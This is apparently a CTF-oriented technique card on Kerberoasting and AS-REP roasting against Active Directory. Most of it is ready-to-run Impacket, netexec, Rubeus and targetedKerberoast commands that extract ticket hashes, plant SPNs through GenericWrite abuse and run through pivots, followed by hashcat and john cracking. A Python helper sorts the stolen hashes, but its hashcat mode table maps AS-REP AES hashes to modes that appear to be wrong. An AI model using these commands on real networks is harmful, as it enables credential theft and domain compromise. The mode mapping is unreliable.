---
title: "Kerberos Ticket Attacks - Kerberoasting and AS-REP Roasting"
category: misc
subcategory: active-directory
type: technique
tags: [kerberoasting, asreproast, kerberos, impacket, netexec, rubeus, hashcat, john, active-directory, getuserspns, getnpusers, spn, tgs, tgt, cracking]
difficulty: medium
summary: "Request Kerberos blobs encrypted with an account's password-derived key, then crack them offline: SPN accounts (Kerberoast) and no-preauth accounts (AS-REP)."
when_to_use:
  - "You have any valid domain credential (Kerberoasting) or just a user list (AS-REP roasting)"
  - "Enumeration flagged accounts with a servicePrincipalName or DONT_REQ_PREAUTH set"
  - "You need offline-crackable material without touching a target host"
  - "You have GenericWrite over a user and want to make it kerberoastable (targeted roast)"
tools: [impacket, netexec, rubeus, hashcat, john, kerbrute]
related: [ad-enumeration-bloodhound, ad-credential-attacks, ad-acl-delegation-abuse]
---

## TL;DR

Kerberos hands out blobs encrypted with a principal's long-term key (derived from its password).
Two accounts leak crackable blobs: service accounts (any authenticated user can request a TGS ->
**Kerberoasting**) and accounts with pre-auth disabled (anyone can request an AS-REP ->
**AS-REP roasting**). Crack them offline with hashcat.

## Recognise it

- LDAP enumeration showed users with `servicePrincipalName` set (Kerberoastable).
- LDAP showed users with `userAccountControl` bit `DONT_REQ_PREAUTH` (0x400000) set (AS-REP roastable).
- BloodHound marks `hasspn=true` or `dontreqpreauth=true`.
- Service accounts (svc-sql, svc-web, MSSQLSvc/...) usually have weak, human-set passwords.

## Theory

- **AS-REQ/AS-REP**: pre-authentication proves you know the password before the KDC issues a TGT.
  If pre-auth is disabled, the KDC returns an AS-REP whose enc-part is encrypted with the target
  user's key -- crackable without any credential.
- **TGS-REQ/TGS-REP**: any authenticated principal can ask for a service ticket (TGS) for any SPN.
  Part of that ticket is encrypted with the *service account's* key -- crackable offline.
- RC4 (etype 23) blobs (`$krb5tgs$23$`, `$krb5asrep$23$`) crack fastest; AES256 (etype 18) is
  slower. You cannot always choose, but you can request RC4 where the account allows it.

## Attack

### AS-REP roasting

```bash
# Impacket: roast a supplied user list without any password (no-preauth accounts only)
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.5 -format hashcat -outputfile asrep.hash

# With a valid credential, let the DC tell you which accounts are roastable
GetNPUsers.py corp.local/jdoe:'Summer2024!' -request -dc-ip 10.10.10.5 -format hashcat -outputfile asrep.hash

# netexec equivalent over LDAP
netexec ldap 10.10.10.5 -u jdoe -p 'Summer2024!' --asreproast asrep.hash

# Rubeus on a Windows foothold
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.hash
```

Hash format is `$krb5asrep$23$user@DOMAIN:...`. Crack with hashcat mode **18200**:

```bash
# Crack AS-REP RC4 blobs
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

# With a rule set for mangling
hashcat -m 18200 asrep.hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### Kerberoasting

```bash
# Impacket: request TGS for every SPN account and dump crackable hashes
GetUserSPNs.py corp.local/jdoe:'Summer2024!' -dc-ip 10.10.10.5 -request -outputfile kerb.hash

# Just list the SPN accounts without requesting (recon)
GetUserSPNs.py corp.local/jdoe:'Summer2024!' -dc-ip 10.10.10.5

# Target a single account
GetUserSPNs.py corp.local/jdoe:'Summer2024!' -dc-ip 10.10.10.5 -request-user svc-sql -outputfile kerb.hash

# netexec over LDAP
netexec ldap 10.10.10.5 -u jdoe -p 'Summer2024!' --kerberoasting kerb.hash

# Rubeus on a Windows foothold; /nowrap keeps the hash on one line
.\Rubeus.exe kerberoast /nowrap /format:hashcat /outfile:kerb.hash
```

Crack with hashcat: **13100** for RC4 (`$krb5tgs$23$`), **19700** for AES256 (`$krb5tgs$18$`):

```bash
# RC4 service tickets (most common, fastest)
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# AES256 service tickets
hashcat -m 19700 kerb.hash /usr/share/wordlists/rockyou.txt

# john equivalent
john --format=krb5tgs --wordlist=rockyou.txt kerb.hash
```

### Encryption downgrade

If an account supports RC4, request that etype to get the faster-cracking blob. Rubeus can force it;
impacket honours what the account advertises. Check the etype in the hash prefix (`$23$` = RC4,
`$18$` = AES256).

```bash
# Rubeus: request RC4 tickets explicitly when the account permits
.\Rubeus.exe kerberoast /rc4opsec /nowrap /outfile:kerb.hash
```

### Targeted Kerberoasting (GenericWrite abuse)

If you have `GenericWrite`/`WriteProperty` over a user account, write an SPN onto it, roast it,
then remove the SPN.

```bash
# Set an SPN on a controllable account with targetedKerberoast (does it and cleans up)
targetedKerberoast.py -v -d corp.local -u jdoe -p 'Summer2024!' --dc-ip 10.10.10.5

# Manual with impacket: add the SPN via addspn, roast, remove
addspn.py -u 'corp.local\jdoe' -p 'Summer2024!' -t victimuser --spn 'HOST/attacker' 10.10.10.5
GetUserSPNs.py corp.local/jdoe:'Summer2024!' -request-user victimuser -dc-ip 10.10.10.5 -outputfile kerb.hash
addspn.py -u 'corp.local\jdoe' -p 'Summer2024!' -t victimuser --spn 'HOST/attacker' -r 10.10.10.5
```

### Doing it through a pivot / with tickets

```bash
# Route impacket through a SOCKS proxy (chisel/ligolo) via proxychains
proxychains GetUserSPNs.py corp.local/jdoe:'Summer2024!' -dc-ip 10.10.10.5 -request -outputfile kerb.hash

# Use an existing Kerberos ticket cache instead of a password (-k -no-pass + KRB5CCNAME)
export KRB5CCNAME=/tmp/jdoe.ccache
GetUserSPNs.py -k -no-pass corp.local/jdoe -dc-ip dc01.corp.local -request -outputfile kerb.hash
```

## Code

Split a mixed hashcat capture file into AS-REP and TGS buckets and print the exact hashcat command
for each, including the etype-correct mode.

```python
#!/usr/bin/env python3
"""Sort krb5 hashes and emit the right hashcat command per type/etype.

Usage:
    python3 krb_sort.py captured.hash
"""
from __future__ import annotations

import sys

MODES = {
    ("asrep", "23"): 18200,
    ("tgs", "23"): 13100,
    ("tgs", "17"): 19600,   # AES128 service ticket
    ("tgs", "18"): 19700,   # AES256 service ticket
    ("asrep", "17"): 19600,
    ("asrep", "18"): 19800,
}


def classify(line: str) -> tuple[str, str] | None:
    """Return (kind, etype) for a hash line, or None if unrecognised."""
    line = line.strip()
    if line.startswith("$krb5asrep$"):
        kind = "asrep"
    elif line.startswith("$krb5tgs$"):
        kind = "tgs"
    else:
        return None
    # format is $krb5tgs$<etype>$... or $krb5asrep$<etype>$...
    parts = line.split("$")
    etype = parts[2] if len(parts) > 2 and parts[2].isdigit() else "23"
    return kind, etype


def main(argv: list[str]) -> int:
    if len(argv) != 2:
        print(__doc__)
        return 1
    buckets: dict[tuple[str, str], list[str]] = {}
    with open(argv[1], "r", encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            info = classify(line)
            if info is None:
                continue
            buckets.setdefault(info, []).append(line.strip())

    if not buckets:
        print("no recognised krb5 hashes found")
        return 0

    for (kind, etype), items in buckets.items():
        fname = f"{kind}_e{etype}.hash"
        with open(fname, "w", encoding="utf-8") as out:
            out.write("\n".join(items) + "\n")
        mode = MODES.get((kind, etype))
        mode_str = str(mode) if mode is not None else "??"
        print(f"[+] {len(items):>3} {kind} etype {etype} -> {fname}")
        print(f"    hashcat -m {mode_str} {fname} rockyou.txt -r rules/best64.rule")
    return 0


if __name__ == "__main__":
    # self-test the classifier
    assert classify("$krb5asrep$23$user@CORP:abcd") == ("asrep", "23")
    assert classify("$krb5tgs$18$svc$CORP$svc/host:abcd") == ("tgs", "18")
    raise SystemExit(main(sys.argv))
```

## Variants & pitfalls

- **Clock skew** breaks every Kerberos request (`KRB5KDC_ERR_SKEW`). Sync to the DC:
  `sudo ntpdate 10.10.10.5` or run tooling under `faketime`.
- **AS-REP needs no creds, only a username list.** Kerberoasting needs a valid credential. Use
  `kerbrute userenum` to build a valid user list first if you have none.
- **AES vs RC4.** Modern accounts get AES-only blobs (`$18$`), which crack far slower. Prefer RC4
  where the account allows it; otherwise budget GPU time or a targeted wordlist.
- **Machine accounts** are also kerberoastable but their passwords are 120+ random chars -- do not
  waste time cracking them.
- **`-outputfile` format.** Impacket writes hashcat format directly; do not hand-edit it. One
  hash per line.
- **Roasting is loud in real environments** (event 4769) but fine in CTF. Targeted kerberoast
  leaves an SPN behind if the tool crashes -- clean it up.
- **Empty results with valid creds** usually mean no SPN accounts exist, or you are AES-only and
  the tool filtered them; check with the recon (`-request` off) run.

## Tools

- `impacket` (`GetNPUsers.py`, `GetUserSPNs.py`, `addspn.py`, `targetedKerberoast.py`).
- `netexec` (`--asreproast`, `--kerberoasting`).
- `Rubeus` (`asreproast`, `kerberoast`) on Windows footholds.
- `hashcat` (18200 AS-REP RC4, 13100 TGS RC4, 19700 TGS AES256) and `john` (`krb5asrep`, `krb5tgs`).
- `kerbrute` for building/validating a user list.

## References

- RFC 4120 (Kerberos V5) for the AS/TGS exchange definitions.
- The impacket example script docstrings (`GetUserSPNs.py -h`, `GetNPUsers.py -h`).
- The hashcat example-hashes page shipped with the tool for the exact mode numbers.
